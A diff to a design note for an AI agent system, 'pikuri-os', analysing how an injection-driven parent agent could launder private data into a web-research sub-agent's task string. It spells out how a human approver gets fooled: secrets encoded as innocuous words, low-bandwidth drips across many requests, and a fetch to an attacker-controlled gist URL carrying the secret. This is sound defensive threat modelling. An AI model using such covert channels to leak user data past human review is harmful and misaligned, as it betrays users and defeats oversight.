@@ -251,6 +251,102 @@ See the sibling note for the privacy levels (Sealed / Bounded / Off),
 the `web_search`-vs-`fetch` destination-control distinction, and why
 the `fetch` whitelist is killed.
 
+### Shipped instance (partial): `pikuri-os --with-internet`
+
+The author-seat half of this primitive now has a worked example in
+`bin/pikuri-os-assistant`. Recorded here precisely, because the obvious
+one-liner — *"we cut off the egress leg by having the user confirm the
+research task"* — is wrong on both the verb and the credit, in exactly
+the ways the three bullets above predict:
+
+- **Egress is severed structurally *first*, not by the gate.** bash is
+  kernel-severed (`Sandbox::FullFsNoNet`, `--unshare-net`) and the web
+  tools live only on the `RESEARCHER` sub-agent, which has **no
+  filesystem** (`add_sub_agent_tool`) — so the parent holds zero direct
+  egress and the researcher holds no private data. The one private→egress
+  channel left open is the parent laundering a secret into the
+  sub-agent's **task string**. That single channel is all the human gate
+  governs; privilege-separation + kernel-sever did the rest.
+- **It's the author seat, not approval.** The `agent` tool asks with
+  `editable: true` (`SubAgent::SubAgentTool`), so the human *rewrites*
+  the task an injection-driven parent proposed rather than judging it —
+  the "author, not approver" role, made real exactly once. (Mechanism +
+  rationale graduated to {Pikuri::Workspace::Confirmer} and CLAUDE.md's
+  Confirmer seam; the egress-wiring reasoning lives in
+  [`more-confirmers.md`](more-confirmers.md) §"Egress axis.")
+- **Two gaps from the designed model.** (a) *No taint tracking* — the
+  gate fires on **every** delegation, not just post-`:private`, so it's
+  coarser than the sibling note's monotonic taint but strictly never
+  misses. (b) The terminal **pre-fills** the proposed task, so the human
+  is author-*capable* but approve-*by-default*; the clean-by-construction
+  property only fully holds when they actually rewrite. A rubber-stamp of
+  a laundered task is the residual hole (the `more-confirmers.md`
+  forced-authorship knife-edge).
+
+In detector terms: the `--with-internet` parent is
+`{private, egress (propagated from RESEARCHER), untrusted_weakened}` — a
+**soft notice** — promoted to a full **loud** `{private, egress,
+untrusted}` the moment it reads a hard-`:untrusted` local file (bash /
+`Read` over a hostile file on disk). Separation only raised the bar; the
+author gate on the task string is what is meant to hold the line there.
+The taint half of this primitive is still **designed, not built**.
+
+### Does a patient human approver stop egress? (No — only a rewriter)
+
+The tempting stronger claim: *"a patient human who carefully
+approves/denies each research task stops the egress of **any** private
+data."* It collapses the two roles the note keeps apart, and it holds
+only under the *rewrite* reading:
+
+- **Author (rewrites the task): clean by construction.** The only bytes
+  that leave are the ones the human chose to type. A covert channel
+  cannot survive being retyped by someone who isn't trying to leak — the
+  attacker can influence the parent's *proposal*, but if the human
+  ignores it and types their own query, the encoding is gone. This is
+  why "authoring is clean" is structural, not a slogan.
+- **Approver (inspects the proposed task): does *not* close it, and
+  patience doesn't help.** Inspection catches the obvious (`research the
+  drug named <SSN>`) but fails two ways being careful and slow cannot
+  fix:
+  1. **Encoding / disguise.** The secret as base64, as GPS coordinates
+     that read as a place, as a password that reads as a word:
+     `look up the definition of "hunter2waterfall"`. One request, fully
+     plausible, unrecoverable by reading — the human would have to
+     already know the secret and be diffing against it to catch it,
+     which defeats the point.
+  2. **Low-bandwidth drip.** Leak a fragment per request across many
+     innocuous requests — `define "apple"` … `define "bridge"` … where
+     the word choice (or ordering, or count) encodes the secret. Each
+     request is individually clean; the human has no aggregate baseline
+     to see the channel. Patience makes this **worse**, not better: more
+     patiently-approved requests = more channel capacity.
+
+So patient *approval* closes the easy, high-bandwidth exfil and forces
+the attacker down to a covert, encoded, low-bandwidth channel — a large,
+real reduction, but **not "any."** The word "any" holds only under
+rewrite.
+
+Two pikuri-os specifics that sharpen this:
+
+- **`web_search` vs `fetch` destinations.** A laundered *search query*
+  reaches only a pikuri-picked engine (write-only from the attacker's
+  view — unreadable unless they run/observe it), so that leg stays
+  bounded even when the human misses it. But `RESEARCHER` also holds
+  `fetch`, whose *host* is attacker-controlled — a laundered
+  `fetch https://gist.github.com/<attacker>/…?d=<secret>` is directly
+  readable. The human sees the host, but "is `github.com`
+  attacker-readable?" is exactly the unjudgeable question behind the
+  killed fetch-whitelist ([`private-context-taint.md`](private-context-taint.md)).
+  So even careful host-inspection doesn't save the `fetch` leg.
+- **The pre-fill tips pikuri-os toward the weaker reading.** Because the
+  terminal pre-fills the proposed task, the path of least resistance is
+  *approve*, not *rewrite* — so in practice pikuri-os delivers the
+  "raises the bar" guarantee, and delivers "clean by construction" only
+  for the fraction of turns the human actually retypes. This is the same
+  residual hole as the pre-fill gap above, stated as a security bound:
+  the strong "stops any egress" claim needs the human in **author**
+  mode, which the current chrome invites but does not enforce.
+
 ## Open: propagating this to docs + example scripts
 
 The algorithm is settled; how it shows up to a *reader* is not. To
